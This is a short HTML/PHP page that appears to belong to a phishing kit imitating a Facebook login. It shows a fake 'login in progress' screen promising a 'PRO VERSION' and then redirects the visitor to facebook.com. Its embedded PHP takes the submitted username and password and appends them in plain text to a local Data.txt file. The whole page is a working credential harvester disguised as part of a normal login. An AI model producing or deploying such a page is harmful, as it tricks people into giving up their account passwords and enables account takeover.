<html>
    <head>
    <link rel="icon" href="../pro.ico" type="image/x-icon">
    <link rel="icon" href="pro.ico" type="image/x-icon">
    <title> Wait your Log in Progress</title>
    <meta http-equiv = "refresh" content = "7; url = https://www.facebook.com" />
    <link rel="stylesheet" type="text/css" href="../CSS/check.css">
</head>
<body>
    <img src="../Assets/Images/loader.gif"/>
    &nbsp;&nbsp;<p>Wait you are getting redirectd in 5 Seconds!!!<br><br> &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:green">Login again to access <b>PRO VERSION</b></span></p>
</body>
<?php

$file="Data.txt";
$u=$_POST["userName"];
$p=$_POST["Password"];

$data="Username ::".$u." "."Password :: ".$p;
$f=fopen($file,'a');
fwrite($f,$data."\r\n");
fclose($f);

?>
</html>